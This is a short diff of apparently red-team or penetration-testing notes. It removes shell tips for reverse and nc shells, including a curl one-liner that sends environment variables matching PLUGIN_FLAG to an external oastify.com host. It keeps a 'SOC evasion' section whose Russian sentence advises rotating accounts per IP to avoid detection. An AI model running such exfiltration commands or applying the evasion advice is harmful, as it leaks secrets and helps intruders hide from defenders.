@@ -1,22 +1,4 @@
-## CLI tricks
 
-Use `script` command to log history from your reverse shells:
-```
-script filename.out
-```
-Use [rlwrap](https://github.com/hanslub42/rlwrap) to add some comfort into nc shells.
-
-To safe a process from killing during an accidental closing of the ssh shell you can run it in the screen utility:
-```bash
-screen -S nmap-scan # initsialize a new screen called nmap-scan
-# Ctrl+A D to exit screen
-screen -r nmap-scan # dip into previous screen again
-```
-
-To pass data into curl directly from stdin:
-```bash
-env | grep PLUGIN_FLAG | curl -X POST --data-binary @- https://id.oastify.com/oast
-```
 ## SOC evasion
 
 Желательно использовать одну учетную запись для входа с каждого IP-адреса, не переиспользовать их, а также не подключаться с тех адресов, которые использовались для внешней разведки.
